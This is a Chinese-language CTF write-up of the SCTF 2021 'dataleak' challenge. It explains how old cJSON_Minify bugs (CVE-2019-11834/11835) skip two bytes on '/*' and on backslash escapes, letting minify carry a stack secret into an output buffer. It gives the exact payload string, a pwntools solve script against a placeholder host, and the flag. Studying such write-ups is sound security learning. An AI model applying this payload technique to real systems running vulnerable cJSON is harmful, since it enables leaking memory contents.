# dataleak

## 题目简述

程序在栈上顺序放置 `buf1[16]`、`buf2[16]` 和 25 字节的随机秘密。每轮向两个缓冲区各读取 14 字节，对 `buf1` 调用旧版 `cJSON_Minify`，随后输出 `buf2` 的前 11 字节；共执行两轮。外层 loader 生成 22 字节秘密，子进程退出后要求选手原样提交，正确才打印 flag。

漏洞来自旧版 cJSON 的两个指针跳跃缺陷，即 CVE-2019-11834/11835：处理块注释起点 `/*`，以及字符串中的反斜杠转义时，读指针会额外前进两个字节。由于 `buf1`、`buf2` 和秘密在栈上相邻，连续构造跳跃即可让 minify 的读写指针跨越缓冲区，把秘密搬进随后会输出的 `buf2`。

## 解题过程

每个 16 字节缓冲区只读取 14 字节，末尾两个字节保持为零。正常情况下，`cJSON_Minify(buf1)` 不应触及 `buf2`；但以下两类序列会改变源码指针：

- 在字符串状态下遇到 `\`，实现会把转义符和下一个字节一起跳过，但相关字节仍可能被复制；
- 遇到 `/*` 时进入注释处理，指针跨过两个字节，注释内容本身被舍弃。

利用需要同时控制两轮的 `buf1` 和 `buf2`，所以把四段 14 字节输入一次性发送。官方构造为：

```text
"aaaaaaaaaaaa\/*aaaaaaaaaaaa/*aaaaaaaaaaaaaaaaa/*aaaaaaa
```

这串数据的作用不是形成合法 JSON，而是精确驱动 `cJSON_Minify` 的读写指针。第一层跳跃从 `buf1` 越过终止零进入 `buf2`，第二层再从 `buf2` 跨到紧邻的 `leakdata`；注释分支舍弃占位字节，反斜杠分支保留需要搬运的数据。minify 原地写回后，`write(1, buf2, 11)` 泄露秘密的前 11 字节。第二轮以相同布局泄露后 11 字节。

交互脚本只需严格收取两段定长输出，避免把提示行混入秘密：

```python
from pwn import remote

payload = b'"aaaaaaaaaaaa\\/*aaaaaaaaaaaa/*aaaaaaaaaaaaaaaaa/*aaaaaaa'

io = remote("challenge-host", 10000)
io.send(payload)
leaked = io.recvn(22)
assert len(leaked) == 22
io.sendlineafter(b"input your leaked data:\n", leaked)
print(io.recvall().decode())
```

外层 loader 中的 22 字节由被随机字节异或后的 `sctf2021` 十六进制、字符串 `00` 和两个随机字节组成，因此每次连接都不同，不能硬编码旧回包。成功提交当轮泄露值后得到：

```text
SCTF{cJSON_1eakdata_Never_trust_4n_escape_character}
```

## 方法总结

本题把解析器中的“额外跳过两个字节”放大成跨栈对象的数据搬运。分析重点是分别跟踪读指针、写指针和哪些字符会被保留，而不是把载荷当作 JSON 语义理解。两次 11 字节泄露刚好覆盖 22 字节随机秘密；最终提交必须来自同一连接。归档时将原 WP 的源码、栈布局和终端截图全部转成了文字与代码，避免依赖图片才能理解指针跨越过程。
